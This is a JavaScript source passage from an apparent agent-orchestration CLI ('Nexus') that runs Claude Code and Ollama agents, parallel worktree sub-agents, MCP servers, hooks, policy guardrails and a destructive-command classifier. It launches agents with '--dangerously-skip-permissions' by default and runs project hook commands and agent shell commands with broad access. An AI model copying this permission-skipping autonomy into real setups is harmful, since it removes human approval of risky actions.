    try { p.stdin.end(); } catch (_) {} // signal EOF so the CLI doesn't wait on stdin
    p.stdout.on("data", (d) => { const s = d.toString(); out += s; if (onChunk) onChunk(s); else process.stdout.write(gray("    " + s.replace(/\n/g, "\n    "))); });
    p.stderr.on("data", (d) => (out += d.toString()));
    const to = setTimeout(() => { try { p.kill("SIGKILL"); } catch (_) {} }, 40 * 60 * 1000);
    p.on("close", (code) => { clearTimeout(to); resolve({ ok: code === 0, output: out.slice(-12000) }); });
    p.on("error", (e) => { clearTimeout(to); resolve({ ok: false, output: "engine spawn error: " + e.message + " (is '" + engine + "' installed & logged in?)" }); });
  });
}
// Claude Code stream-json driver — parses NDJSON events so the TUI can render
// tool cards, live token usage, cost and context size exactly like Claude Code.
function runClaudeStream(prompt, cwd, cont, h, ctl, opts) {
  opts = opts || {};
  return new Promise((resolve) => {
    const args = opts.readonly ? ["-p", prompt, "--output-format", "stream-json", "--verbose", "--permission-mode", "plan"] : ["-p", prompt, "--output-format", "stream-json", "--verbose", "--dangerously-skip-permissions"];
    if (cont) args.push("--continue");
    if (opts.model) args.push("--model", opts.model);
    if (opts.effort) args.push("--effort", opts.effort);
    if (opts.appendSystemPrompt) args.push("--append-system-prompt", opts.appendSystemPrompt);
    if (opts.fallbackModel) args.push("--fallback-model", opts.fallbackModel);
    if (opts.maxBudgetUsd) args.push("--max-budget-usd", String(opts.maxBudgetUsd));
    if (opts.disallow && opts.disallow.length) args.push("--disallowed-tools", ...opts.disallow);
    const env = opts.small ? Object.assign({}, process.env, { ANTHROPIC_SMALL_FAST_MODEL: opts.small, CLAUDE_CODE_BG_CLASSIFIER_MODEL: opts.small }) : process.env;
    const cp = _cp.spawn("claude", args, { cwd, env });
    try { cp.stdin.end(); } catch (_) {} // signal EOF so claude doesn't wait on stdin
    let buf = "", finalText = "", res = null, killed = false;
    if (ctl) ctl.kill = () => { killed = true; try { cp.kill("SIGINT"); } catch (_) {} setTimeout(() => { try { cp.kill("SIGKILL"); } catch (_) {} }, 1500); };
    cp.stdout.on("data", (d) => {
      buf += d.toString();
      let nl;
      while ((nl = buf.indexOf("\n")) >= 0) {
        const line = buf.slice(0, nl); buf = buf.slice(nl + 1);
        if (!line.trim()) continue;
        let ev; try { ev = JSON.parse(line); } catch (_) { continue; }
        if (ev.type === "system" && ev.subtype === "init") { h.onInit && h.onInit(ev); }
        else if (ev.type === "rate_limit_event") { h.onRateLimit && h.onRateLimit(ev.rate_limit_info || {}); }
        else if (ev.type === "assistant" && ev.message) {
          for (const c of ev.message.content || []) {
            if (c.type === "text" && c.text) { finalText += c.text; h.onText && h.onText(c.text); }
            else if (c.type === "thinking" && c.thinking) { h.onThinking && h.onThinking(c.thinking); }
            else if (c.type === "tool_use") { h.onTool && h.onTool({ id: c.id, name: c.name, input: c.input || {} }); }
          }
          if (ev.message.usage) h.onUsage && h.onUsage(ev.message.usage, ev.message.model);
        }
        else if (ev.type === "user" && ev.message) {
          for (const c of ev.message.content || []) if (c.type === "tool_result") h.onToolResult && h.onToolResult({ id: c.tool_use_id, content: c.content, isError: c.is_error });
        }
        else if (ev.type === "result") { res = ev; if (ev.result && !finalText.trim()) finalText = ev.result; h.onResult && h.onResult(ev); }
      }
    });
    cp.stderr.on("data", () => {});
    const to = setTimeout(() => { try { cp.kill("SIGKILL"); } catch (_) {} }, 40 * 60 * 1000);
    cp.on("close", (code) => { clearTimeout(to); resolve({ ok: code === 0 && !killed, interrupted: killed, output: finalText, result: res }); });
    cp.on("error", (e) => { clearTimeout(to); resolve({ ok: false, output: "engine spawn error: " + e.message + " (is claude installed & logged in?)" }); });
  });
}
// Safe, non-destructive git checkpoint (captures tracked + untracked into a tree
// object using a temp index; never touches HEAD/index/history). /undo restores
// tracked file contents to the snapshot and never deletes anything.
function nexusCheckpoint(cwd) {
  try {
    const path = require("path"), fs = require("fs");
    _cp.execSync("git rev-parse --is-inside-work-tree", { cwd, stdio: "ignore" });
    const idx = path.join(cwd, ".nexus", "ckpt.index");
    fs.mkdirSync(path.join(cwd, ".nexus"), { recursive: true });
    try { fs.unlinkSync(idx); } catch (_) {}
    const env = Object.assign({}, process.env, { GIT_INDEX_FILE: idx });
    _cp.execSync("git add -A", { cwd, env, stdio: "ignore" });
    try { _cp.execSync("git rm -r --cached --ignore-unmatch --quiet .nexus", { cwd, env, stdio: "ignore" }); } catch (_) {} // never snapshot/restore Nexus's own state dir
    const tree = _cp.execSync("git write-tree", { cwd, env }).toString().trim();
    try { fs.unlinkSync(idx); } catch (_) {}
    return tree || null;
  } catch (_) { return null; }
}
// Restore a snapshot. If `paths` is given (repo-relative), restore ONLY those files
// (via a throwaway commit) so unrelated manual edits are never clobbered. Otherwise
// full-tree restore (fallback). Returns true on success.
function nexusRestore(cwd, tree, paths) {
  try {
    const path = require("path"), fs = require("fs");
    if (!paths || !paths.length) return true; // never full-clobber the tree — only restore files Nexus recorded changing
    const commit = _cp.execSync("git commit-tree " + tree + " -m nexus-restore", { cwd, encoding: "utf8" }).trim();
    const present = [], created = [];
    for (const p of paths) { try { _cp.execSync("git cat-file -e " + commit + ":./" + p.replace(/"/g, ""), { cwd, stdio: "ignore" }); present.push(p); } catch (_) { created.push(p); } }
    if (present.length) _cp.execSync("git checkout " + commit + " -- " + present.map((p) => JSON.stringify(p)).join(" "), { cwd, stdio: "ignore" });
    for (const p of created) { try { fs.rmSync(path.resolve(cwd, p), { force: true }); } catch (_) {} } // files the turn created → remove them on undo
    return true;
  } catch (_) { return false; }
}
// ---------- MCP (Model Context Protocol): minimal dependency-free JSON-RPC-2.0 stdio client ----------
function loadMcpConfig(cwd) {
  const fs = require("fs"), path = require("path");
  for (const f of [path.join(cwd, ".nexus", "mcp.json"), path.join(cwd, ".mcp.json")]) { try { const j = JSON.parse(fs.readFileSync(f, "utf8")); if (j && j.mcpServers && Object.keys(j.mcpServers).length) return j.mcpServers; } catch (_) {} }
  return null;
}
function mcpConnect(name, spec, cwd) {
  return new Promise((resolve) => {
    let cp; try { cp = _cp.spawn(spec.command, spec.args || [], { cwd, env: Object.assign({}, process.env, spec.env || {}), stdio: ["pipe", "pipe", "ignore"] }); } catch (e) { return resolve({ name, error: e.message }); }
    let buf = "", idc = 0; const pending = {};
    cp.stdout.on("data", (d) => { buf += d.toString(); let nl; while ((nl = buf.indexOf("\n")) >= 0) { const line = buf.slice(0, nl); buf = buf.slice(nl + 1); if (!line.trim()) continue; let m; try { m = JSON.parse(line); } catch (_) { continue; } if (m.id != null && pending[m.id]) { pending[m.id](m); delete pending[m.id]; } } });
    cp.on("error", () => {});
    const call = (method, params) => new Promise((res, rej) => { const id = ++idc; pending[id] = (m) => m.error ? rej(new Error(m.error.message || "mcp error")) : res(m.result); try { cp.stdin.write(JSON.stringify({ jsonrpc: "2.0", id, method, params: params || {} }) + "\n"); } catch (e) { return rej(e); } setTimeout(() => { if (pending[id]) { delete pending[id]; rej(new Error("mcp timeout")); } }, 20000); });
    const notify = (method, params) => { try { cp.stdin.write(JSON.stringify({ jsonrpc: "2.0", method, params: params || {} }) + "\n"); } catch (_) {} };
    (async () => {
      try {
        await call("initialize", { protocolVersion: "2024-11-05", capabilities: {}, clientInfo: { name: "nexus", version: "1.0" } });
        notify("notifications/initialized", {});
        const tl = await call("tools/list", {});
        resolve({ name, cp, call, tools: (tl && tl.tools) || [] });
      } catch (e) { try { cp.kill(); } catch (_) {} resolve({ name, error: e.message }); }
    })();
  });
}
// ---------- Hooks: run project-defined shell commands around events (Claude-Code style) ----------
function loadHooks(cwd) { const fs = require("fs"), path = require("path"); try { return JSON.parse(fs.readFileSync(path.join(cwd, ".nexus", "hooks.json"), "utf8")); } catch (_) { return null; } }

// ================= enterprise guardrails: policy + audit =================
// A declarative, per-project security policy the agent is HELD TO — protected
// paths it can't touch, commands it can't run, a per-turn write ceiling, secret-
// write blocking, and a tamper-evident audit trail. Local-agent tool calls are
// enforced hard (we execute them); the cloud engine gets the policy injected into
// its system prompt plus the existing plan-mode / disallowed-tools controls.
const { POLICY_DEFAULTS, globToRe, pathMatchesAny, policyCheck, auditLog, auditVerify } = require("./lib/policy"); // guardrails engine (lib/policy.js)
const { validatePolicy, validateTeam } = require("./lib/validate"); // config validation (lib/validate.js)
// Read + validate the raw .nexus/policy.json and ~/.sentinel/policy.json; returns warning strings.
function policyWarnings(cwd) { const fs = require("fs"), path = require("path"); const w = []; for (const [label, p] of [["local .nexus/policy.json", path.join(cwd, ".nexus", "policy.json")], ["org ~/.sentinel/policy.json", path.join(sentinelHome(), "policy.json")]]) { let raw; try { raw = fs.readFileSync(p, "utf8"); } catch (_) { continue; } let obj; try { obj = JSON.parse(raw); } catch (e) { w.push(label + ": invalid JSON (" + e.message + ")"); continue; } for (const m of validatePolicy(obj)) w.push(label + ": " + m); } return w; }
// Two-tier policy: an ORG floor at ~/.sentinel/policy.json (set by an admin) that a
// local .nexus/policy.json can only make STRICTER, never weaken — protected paths and
// denied commands union, boolean guards ratchet on, and the file limit takes the min.
function loadPolicy(cwd) {
  const fs = require("fs"), path = require("path");
  const read = (p) => { try { return JSON.parse(fs.readFileSync(p, "utf8")) || {}; } catch (_) { return {}; } };
  const org = read(path.join(sentinelHome(), "policy.json"));
  const local = read(path.join(cwd, ".nexus", "policy.json"));
  const uniq = (a) => [...new Set(a.filter(Boolean))];
  const p = Object.assign({}, POLICY_DEFAULTS, local, org); // org wins on any scalar it sets
  p.protectedPaths = uniq([].concat(POLICY_DEFAULTS.protectedPaths, local.protectedPaths || [], org.protectedPaths || []));
  p.deniedCommands = uniq([].concat(local.deniedCommands || [], org.deniedCommands || []));
  p.requireApprovalPaths = uniq([].concat(local.requireApprovalPaths || [], org.requireApprovalPaths || []));
  const floorBool = (key) => org[key] === true ? true : (local[key] !== undefined ? local[key] : POLICY_DEFAULTS[key]);
  p.blockSecrets = floorBool("blockSecrets"); p.audit = floorBool("audit");
  p.allowNetwork = org.allowNetwork === false ? false : (local.allowNetwork !== undefined ? local.allowNetwork : POLICY_DEFAULTS.allowNetwork);
  const lm = local.maxFilesPerTurn || 0, om = org.maxFilesPerTurn || 0; p.maxFilesPerTurn = om > 0 ? (lm > 0 ? Math.min(om, lm) : om) : lm;
  p.org = Object.keys(org).length > 0; // org policy present → shown in /policy, can't be relaxed here
  return p;
}
function runHooks(hooks, event, env, cwd) {
  const list = (hooks && hooks[event]) || [];
  for (const h of list) {
    if (!h || !h.command) continue;
    try { if (h.matcher && env.TOOL_NAME && !(new RegExp(h.matcher).test(env.TOOL_NAME))) continue; } catch (_) { continue; } // bad matcher regex must not crash the turn
    try { const r = _cp.spawnSync(h.command, { shell: true, cwd, env: Object.assign({}, process.env, env), encoding: "utf8", timeout: (h.timeout || 15) * 1000 }); if (r.status && r.status !== 0) return { block: true, out: ((r.stdout || "") + (r.stderr || "")).trim().slice(0, 400) }; } catch (_) {} }
  return { block: false };
}
// build an AbortSignal wired to a ctl's kill list (so ctrl+c aborts in-flight ollama requests)
function ctlSignal(ctl) { if (!ctl || !ctl.kids) return undefined; const ac = new AbortController(); ctl.kids.push(() => { try { ac.abort(); } catch (_) {} }); return ac.signal; }
// ---------- Parallel sub-agents: fan a list of independent tasks out across the current engine ----------
async function runSubagents(engine, tasks, cwd, model, onProgress, ctl, pickModel) {
  const path = require("path"), fs = require("fs"), os = require("os");
  const results = new Array(tasks.length);
  // Isolate each concurrent agent in its own git worktree so parallel writers can't
  // corrupt each other; merge their changes back sequentially at the end.
  let baseCommit = null, isGit = false;
  try { _cp.execSync("git rev-parse --is-inside-work-tree", { cwd, stdio: "ignore" }); isGit = true; } catch (_) {}
  if (isGit) { try { const tree = nexusCheckpoint(cwd); if (tree) baseCommit = _cp.execSync("git commit-tree " + tree + " -m nexus-agents-base", { cwd, encoding: "utf8" }).trim(); } catch (_) {} }
  const useWt = !!(isGit && baseCommit);
  const worktrees = new Array(tasks.length).fill(null);
  const stamp = Date.now().toString(36);
  const removeWt = (wt) => { try { _cp.execSync("git worktree remove --force " + JSON.stringify(wt), { cwd, stdio: "ignore" }); } catch (_) { try { fs.rmSync(wt, { recursive: true, force: true }); } catch (__) {} } };
  const runOne = async (i) => {
    if (ctl && ctl.stopped) { results[i] = "(interrupted)"; if (onProgress) onProgress(i, "done"); return; }
    if (onProgress) onProgress(i, "run");
    let dir = cwd;
    if (useWt) { const wt = path.join(os.tmpdir(), "nexus-agent-" + stamp + "-" + i); try { _cp.execSync("git worktree add --detach " + JSON.stringify(wt) + " " + baseCommit, { cwd, stdio: "ignore" }); worktrees[i] = dir = wt; } catch (_) { dir = cwd; } }
    let out;
    try { if (engine === "ollama") { const r = await ollamaExec(model, tasks[i], "", dir, ctlSignal(ctl)); out = (r.output || "").trim(); } else { const r = await runEngineTask(engine, tasks[i], dir, true, false, null, ctl, pickModel ? pickModel(tasks[i]) : undefined); out = (r.output || "").trim(); } }
    catch (e) { out = "error: " + e.message; }
    results[i] = out; if (onProgress) onProgress(i, "done");
  };
  // With isolation, agents run concurrently; without it (no git, or ollama), serialize to avoid corrupting the shared dir.
  const conc = useWt ? Math.max(1, Math.min(4, tasks.length)) : 1;
  let idx = 0; async function worker() { while (idx < tasks.length) { await runOne(idx++); } }
  try { await Promise.all(Array.from({ length: conc }, worker)); }
  finally {
    if (useWt) {
      const claimed = new Map(), conflicts = [];
      for (let i = 0; i < tasks.length; i++) { const wt = worktrees[i]; if (!wt) continue;
        try { const status = _cp.execSync("git -C " + JSON.stringify(wt) + " status --porcelain -uall", { encoding: "utf8" });
          for (const line of status.split("\n")) { if (!line.trim()) continue; const st = line.slice(0, 2); let p = line.slice(3); if (p.includes(" -> ")) { const old = p.split(" -> ")[0].replace(/^"|"$/g, ""); try { fs.rmSync(path.join(cwd, old), { force: true }); } catch (_) {} p = p.split(" -> ")[1]; } p = p.replace(/^"|"$/g, "");
            if (claimed.has(p)) { conflicts.push(p); continue; }
            claimed.set(p, i); const src = path.join(wt, p), dst = path.join(cwd, p);
            try { if (/D/.test(st) && !fs.existsSync(src)) fs.rmSync(dst, { force: true }); else if (fs.existsSync(src)) { fs.mkdirSync(path.dirname(dst), { recursive: true }); fs.copyFileSync(src, dst); } } catch (_) {}
          }
        } catch (_) {}
      }
      for (const wt of worktrees) if (wt) removeWt(wt);
      if (conflicts.length) { const u = [...new Set(conflicts)]; const note = "\n\n[merge: " + u.length + " file(s) were edited by more than one agent — kept the first writer, skipped the rest: " + u.slice(0, 8).join(", ") + "]"; const last = results.length - 1; results[last] = (results[last] || "") + note; }
    }
  }
  return results;
}
// Secret scanner — flags common leaked credentials in text/files (Nexus is a security tool).
const { scanSecrets, maskSecrets, classifyDanger, compactOutput } = require("./lib/security"); // security utils (lib/security.js)
const { allStyles } = require("./lib/styles"); // output styles, built-in + .nexus/styles/*.md (lib/styles.js)
const { mergeMemory } = require("./lib/memory"); // agent `remember` dedup (lib/memory.js)
const { TOOL_CATALOG, discoverTools } = require("./lib/tools"); // agent tool catalog + discover (lib/tools.js)
const { createBgJobs } = require("./lib/bgjobs"); // background command jobs (lib/bgjobs.js)
const { describe: describeSettings } = require("./lib/settings"); // /settings panel schema (lib/settings.js)
// Extended device tools for the local agent: content search, file find, HTTP fetch,
// system info, process list, and filesystem management. Returns a result object,
// or null if `name` isn't a device tool (so the caller can fall through).
async function deviceTool(name, a, cwd) {
  const fs = require("fs"), path = require("path"), os = require("os");
  const rp = (p) => { const r = path.resolve(cwd, p == null ? "." : p); if (r !== cwd && !r.startsWith(cwd + path.sep)) throw new Error("path escapes the project directory: " + p); return r; }; // sandbox all device-tool file ops to cwd
  const SKIP = /(^|\/)(\.git|node_modules|dist|build|\.nexus|\.cache)(\/|$)/;
  if (name === "search" || name === "grep") {
    const pat = a.pattern || a.query || a.q; if (!pat) return { error: "search needs a pattern" };
    let re; try { re = new RegExp(pat, "i"); } catch (_) { re = new RegExp(String(pat).replace(/[.*+?^${}()|[\]\\]/g, "\\$&"), "i"); }
    const out = []; const walk = (d) => { if (out.length >= 100) return; let ents; try { ents = fs.readdirSync(d, { withFileTypes: true }); } catch (_) { return; } for (const e of ents) { const fp = path.join(d, e.name); if (SKIP.test(fp)) continue; if (e.isDirectory()) walk(fp); else { let txt; try { if (fs.statSync(fp).size > 500000) continue; txt = fs.readFileSync(fp, "utf8"); } catch (_) { continue; } const lines = txt.split("\n"); for (let i = 0; i < lines.length && out.length < 100; i++) if (re.test(lines[i])) out.push(path.relative(cwd, fp) + ":" + (i + 1) + ": " + lines[i].trim().slice(0, 160)); } if (out.length >= 100) return; } };
    walk(rp(a.path || ".")); return { matches: out, truncated: out.length >= 100 };
  }
  if (name === "find" || name === "find_files" || name === "glob") {
    const q = String(a.glob || a.pattern || a.name || "").toLowerCase(); const out = [];
    const walk = (d) => { if (out.length >= 300) return; let ents; try { ents = fs.readdirSync(d, { withFileTypes: true }); } catch (_) { return; } for (const e of ents) { const fp = path.join(d, e.name); if (SKIP.test(fp)) continue; if (e.isDirectory()) walk(fp); else if (!q || e.name.toLowerCase().includes(q)) { out.push(path.relative(cwd, fp)); if (out.length >= 300) return; } } };
    walk(rp(a.path || ".")); return { files: out };
  }
  if (name === "http_fetch" || name === "web_fetch" || name === "fetch_url" || name === "http") {
    const url = a.url; if (!url) return { error: "http_fetch needs a url" };
    return await new Promise((resolve) => { try { const lib = String(url).startsWith("https") ? require("https") : require("http"); const req = lib.request(url, { method: a.method || "GET", headers: a.headers || {}, timeout: 15000 }, (res) => { let d = ""; res.on("data", (c) => { if (d.length < 200000) d += c; }); res.on("end", () => resolve({ status: res.statusCode, contentType: res.headers["content-type"], body: d.slice(0, 20000) })); }); req.on("timeout", () => { req.destroy(); resolve({ error: "timeout" }); }); req.on("error", (e) => resolve({ error: e.message })); if (a.body != null) req.write(typeof a.body === "string" ? a.body : JSON.stringify(a.body)); req.end(); } catch (e) { resolve({ error: e.message }); } });
  }
  if (name === "sysinfo" || name === "system_info") {
    let disk = ""; try { disk = _cp.execSync("df -h " + JSON.stringify(cwd) + " 2>/dev/null", { encoding: "utf8" }).trim().split("\n").slice(-1)[0]; } catch (_) {}
    const c = os.cpus()[0] || {};
    return { platform: os.platform(), arch: os.arch(), release: os.release(), hostname: os.hostname(), cpus: os.cpus().length + " x " + (c.model || "?"), memory: (os.totalmem() / 1e9).toFixed(1) + "GB total, " + (os.freemem() / 1e9).toFixed(1) + "GB free", loadavg: os.loadavg().map((n) => n.toFixed(2)).join(" "), uptime: (os.uptime() / 3600).toFixed(1) + "h", cwd, node: process.version, disk };
  }
  if (name === "list_processes" || name === "ps") {
    try { const r = _cp.execSync(process.platform === "win32" ? "tasklist" : "ps aux", { encoding: "utf8", maxBuffer: 4e6 }); let lines = r.split("\n"); if (a.filter) lines = [lines[0]].concat(lines.slice(1).filter((l) => l.toLowerCase().includes(String(a.filter).toLowerCase()))); return { processes: lines.slice(0, 60).join("\n") }; } catch (e) { return { error: e.message }; }
  }
  if (name === "make_dir" || name === "mkdir") { try { fs.mkdirSync(rp(a.path), { recursive: true }); return { ok: true }; } catch (e) { return { error: e.message }; } }
  if (name === "move" || name === "rename" || name === "move_file") { try { fs.renameSync(rp(a.from || a.src), rp(a.to || a.dest)); return { ok: true }; } catch (e) { return { error: e.message }; } }
  if (name === "copy" || name === "copy_file") { try { fs.copyFileSync(rp(a.from || a.src), rp(a.to || a.dest)); return { ok: true }; } catch (e) { return { error: e.message }; } }
  if (name === "delete" || name === "delete_file" || name === "rm") { try { fs.rmSync(rp(a.path), { recursive: !!a.recursive, force: true }); return { ok: true }; } catch (e) { return { error: e.message }; } }
  return null;
}
// Compact large tool output (keep head+tail, drop the middle) to save context tokens.
// ---------- cost-aware model tiering for /cowork ----------
// Rough Claude price table ($ per 1M tokens: input, output). Used only to ESTIMATE
// whether delegating a task to a cheaper model saves more than the delegation overhead.
const { MODEL_PRICE, priceOf, isMechanical, shouldDelegate } = require("./lib/pricing"); // cost model (lib/pricing.js)
// Sentinel preflight — classify a shell command's destructive intent (inspired by Glitch's
// Sentinel, improved: names the matched rule, covers pipe-to-shell + fork bombs, 3 levels).
const { oneline, extractJson } = require("./lib/text"); // pure text helpers (lib/text.js)
async function planGoal(engine, model, goal, memory) {
  const prompt = "You are a senior engineer planning autonomous work. Break the GOAL into an ordered list of concrete, independently-verifiable tasks (about 5-15). Return ONLY a JSON array of short task strings — no prose, no markdown.\n\nGOAL: " + goal + (memory ? "\n\nPROJECT MEMORY:\n" + memory : "");
  let text;
  if (engine === "ollama") text = await ollamaChat(model, [{ role: "user", content: prompt }], { type: "array", items: { type: "string" } });
  else text = (await runEngineTask(engine, prompt, process.cwd(), false)).output;
  let tasks = extractJson(text, null);
  if (!Array.isArray(tasks) || !tasks.length) tasks = [goal];
  return tasks.slice(0, 40).map((t, i) => ({ id: i + 1, title: String(t).slice(0, 300), done: false, failed: false, tries: 0 }));
}
async function verifyTask(engine, model, goal, task, res) {
  if (engine !== "ollama") { const refused = /\b(could ?n['’]?t|could not|unable to|failed to complete|can['’]?t complete|cannot complete|was not able to|were unable to|i (?:can['’]?t|cannot))\b/i.test((res.output || "").slice(-1200)); return { done: res.ok && !refused, reason: !res.ok ? "agent exited non-zero" : (refused ? "agent reported it could not complete the task" : "completed") }; }
  const prompt = "Given the GOAL, a TASK, and the AGENT OUTPUT, decide if the task is genuinely complete. Return ONLY JSON {\"done\":true|false,\"reason\":\"...\"}.\nGOAL: " + goal + "\nTASK: " + task + "\nOUTPUT (truncated):\n" + String(res.output || "").slice(-2500);
  const v = extractJson(await ollamaChat(model, [{ role: "user", content: prompt }], { type: "object", properties: { done: { type: "boolean" }, reason: { type: "string" } }, required: ["done"] }), null);
  return (v && typeof v.done === "boolean") ? { done: v.done, reason: v.reason || "" } : { done: true, reason: "unverifiable" };
}
// Compact single-task tool loop for the local Ollama engine.
async function ollamaExec(model, task, ctx, cwd, signal) {
  const fs = require("fs"), path = require("path");
  const messages = [{ role: "system", content: "You are Nexus, an autonomous coding agent. Complete ONLY the given TASK in the working directory using tools, ONE action per step, then action:'final'. TOOLS: read_file{path}, write_file{path,content}, edit_file{path,find,replace}, list_dir{path?}, run_command{command}. Reply with ONE JSON object per the schema.\n" + ctx }, { role: "user", content: "TASK: " + task }];
  let didTool = false, log = "";
  for (let step = 1; step <= 30; step++) {
    if (signal && signal.aborted) return { ok: false, output: log + "\n(interrupted)" };
    let raw; try { raw = await ollamaChat(model, messages, CODER_SCHEMA, signal); } catch (e) { return { ok: signal && signal.aborted ? false : false, output: (signal && signal.aborted) ? log + "\n(interrupted)" : "model error: " + e.message }; }
    let o; try { o = JSON.parse(raw); } catch (_) { messages.push({ role: "tool", content: "Reply with valid schema JSON." }); continue; }
    messages.push({ role: "assistant", content: raw });
    if (o.thought) console.log("    " + gray(o.thought));
    if (o.action === "final") { if (!didTool && step < 3) { messages.push({ role: "tool", content: "Do the real work first." }); continue; } return { ok: true, output: log + "\n" + (o.final || "") }; }
    const name = o.tool, a = o.args || {}; let result;
    try {
      if (name === "read_file") result = { content: fs.readFileSync(path.resolve(cwd, a.path), "utf8").slice(0, 14000) };
      else if (name === "list_dir") result = { items: fs.readdirSync(path.resolve(cwd, a.path || "."), { withFileTypes: true }).map((e) => e.isDirectory() ? e.name + "/" : e.name).slice(0, 200) };
      else if (name === "write_file") { const fp = path.resolve(cwd, a.path); fs.mkdirSync(path.dirname(fp), { recursive: true }); fs.writeFileSync(fp, a.content == null ? "" : a.content); result = { ok: true }; log += "\nwrote " + a.path; console.log("    " + green("write ") + a.path); }
      else if (name === "edit_file") { const fp = path.resolve(cwd, a.path); const t = fs.readFileSync(fp, "utf8"); if (!t.includes(a.find)) result = { error: "find not present" }; else { fs.writeFileSync(fp, t.replace(a.find, a.replace == null ? "" : a.replace)); result = { ok: true }; log += "\nedited " + a.path; console.log("    " + green("edit ") + a.path); } }
      else if (name === "run_command") { const dg = classifyDanger(a.command); if (dg.level === "block") { result = { error: "blocked by Sentinel (destructive: " + dg.why + ")" }; console.log("    " + red("blocked ") + dg.why); } else { console.log("    " + mag("$ ") + a.command); const r = await coderShell(a.command, cwd); result = { code: r.code, output: compactOutput(r.output, 4000) }; log += "\n$ " + a.command + "\n" + r.output.slice(0, 1200); } }
      else { const dr = await deviceTool(name, a, cwd); result = dr !== null ? dr : { error: "unknown tool " + name }; }
    } catch (e) { result = { error: e.message }; }
    if (!(result && typeof result.error === "string" && result.error.startsWith("unknown tool"))) didTool = true;
    messages.push({ role: "tool", content: JSON.stringify(result).slice(0, 14000) });
  }
  return { ok: true, output: log + "\n(step limit)" };
}
function parseUntil(s) {
  const now = new Date(); let m;
  if ((m = /^(\d{1,2}):(\d{2})$/.exec(s))) { const d = new Date(now); d.setHours(+m[1], +m[2], 0, 0); if (d <= now) d.setDate(d.getDate() + 1); return d.getTime(); }
  if ((m = /^(\d+)h$/.exec(s))) return now.getTime() + (+m[1]) * 3600000;
  if ((m = /^(\d+)m$/.exec(s))) return now.getTime() + (+m[1]) * 60000;
  return 0;
}
function nexusRunHelp() {
  banner(); console.log("  " + bold("Nexus run") + " — autonomous, multi-level goal execution\n");
  console.log("  " + bold("USAGE") + "\n    sentinel nexus run \"<goal>\" [options]\n    sentinel nexus overnight \"<goal>\"   (alias for run --overnight)\n");
  console.log("  " + bold("OPTIONS"));
  console.log("    -e, --engine <name>   claude (default) | hybrid (local does the easy work, Claude the hard — cheapest) | ollama | opencode");
  console.log("    -n, --overnight       keep working the plan with retries until done or --until");
  console.log("        --until <t>       stop at HH:MM, or after 6h / 90m");
  console.log("        --resume          continue the last run in this folder (.nexus/run.json)");
  console.log("    -m, --model <name>    ollama model (ollama engine only)");
  console.log("\n  " + gray("Plan, progress and report live in ./.nexus/ (run.json, report.md, memory.md).") + "\n  " + gray("claude/opencode run with full autonomy (--dangerously-skip-permissions) — use in a trusted repo.") + "\n");
}
// `nexus agents "task1" "task2" …` — run independent tasks in parallel across the current engine.
async function nexusAgents(argv) {
  const fs = require("fs"), path = require("path");
  const arr = (Array.isArray(argv) ? argv.slice() : [String(argv || "")]);
  let engine = ""; const tasks = [];
  for (let i = 0; i < arr.length; i++) { if (arr[i] === "-e" || arr[i] === "--engine") engine = arr[++i] || ""; else tasks.push(arr[i]); }
  const cwd = process.cwd();
  if (!tasks.length) { banner(); console.log("  " + bold("Nexus agents") + " — run independent tasks in parallel\n\n  " + gray("usage: ") + cyan("sentinel nexus agents \"add tests\" \"write docs\" \"fix lint\"") + gray("  [-e claude|gemini|codex|opencode|aider|ollama]") + "\n"); return; }
  let cfg = {}; try { cfg = JSON.parse(fs.readFileSync(path.join(cwd, ".nexus", "config.json"), "utf8")); } catch (_) {}
  engine = engine || cfg.engine || (hasBin("claude") ? "claude" : "ollama");
  let model = cfg.model || process.env.SENTINEL_MODEL || "";
  if (engine === "ollama" && !model) { const ms = await ollamaTags(); model = pickCoderModel(ms); }
  banner(); console.log("  " + bold(tasks.length + " agents") + gray("  ·  engine " + engine + (model ? " (" + model + ")" : "")) + "\n");
  tasks.forEach((t, i) => console.log("  " + cyan("agent " + (i + 1)) + gray("  " + t)));
  console.log("");
  const outs = await runSubagents(engine, tasks, cwd, model, (i, phase) => { if (phase === "run") console.log("  " + yellow("> agent " + (i + 1) + " started")); else console.log("  " + green("● agent " + (i + 1) + " done")); });
  console.log("");
  outs.forEach((o, i) => { console.log("  " + bold(cyan("── agent " + (i + 1) + " ── ")) + gray(tasks[i])); console.log(gray("  " + String(o || "(no output)").replace(/\n/g, "\n  ")) + "\n"); });
}
async function nexusRun(argv) {
  const fs = require("fs"), path = require("path");
  const arr = Array.isArray(argv) ? argv.slice() : String(argv || "").split(/\s+/).filter(Boolean);
  let enginePref = "", overnight = false, resume = false, until = "", modelOverride = "", goalParts = [];
  for (let i = 0; i < arr.length; i++) { const a = arr[i];
    if (a === "--engine" || a === "-e") enginePref = arr[++i] || "";
    else if (a === "--overnight" || a === "-n") overnight = true;
    else if (a === "--resume") resume = true;
    else if (a === "--until") until = arr[++i] || "";
    else if (a === "-m" || a === "--model") modelOverride = arr[++i] || "";
    else if (a === "-h" || a === "--help") return nexusRunHelp();
    else goalParts.push(a);
  }
  const cwd = process.cwd(), NEXUS = path.join(cwd, ".nexus"); fs.mkdirSync(NEXUS, { recursive: true });
  const stateFile = path.join(NEXUS, "run.json"), reportFile = path.join(NEXUS, "report.md"), memFile = path.join(NEXUS, "memory.md");
  const memory = (() => { try { return fs.readFileSync(memFile, "utf8"); } catch (_) { return ""; } })();
  const avail = {}; for (const e of ENGINE_ORDER) avail[e] = engineAvail(e);
  let engine = enginePref || (avail.claude ? "claude" : "ollama");
  if (engine !== "hybrid" && !avail[engine]) { console.log("  " + red("engine '" + engine + "' unavailable; using ollama")); engine = "ollama"; }
  if (engine === "hybrid" && !avail.claude) { console.log("  " + red("hybrid needs Claude Code installed; using ollama")); engine = "ollama"; }
  let model = null;
  if (engine === "ollama" || engine === "hybrid") {
    const ms = await ollamaTags();
    if (!ms.length) { if (engine === "hybrid") { console.log("  " + gray("no local model; hybrid falling back to Claude only")); engine = "claude"; } else { console.log("  " + red("no local model; install Ollama or use --engine claude")); return; } }
    else model = modelOverride || process.env.SENTINEL_MODEL || pickCoderModel(ms);
  }
  let state;
  if (resume && fs.existsSync(stateFile)) { state = JSON.parse(fs.readFileSync(stateFile, "utf8")); banner(); h1("Nexus — resuming run"); }
  else {
    const goal = goalParts.join(" ").trim();
    if (!goal) { console.log("  " + red("provide a goal:  sentinel nexus run \"build X\"")); return; }
    banner(); h1("Nexus — planning");
    console.log("  " + gray("engine ") + mag(engine) + (model ? gray("  model " + model) : "") + gray("  workdir " + cwd));
    console.log("  " + gray("decomposing the goal...\n"));
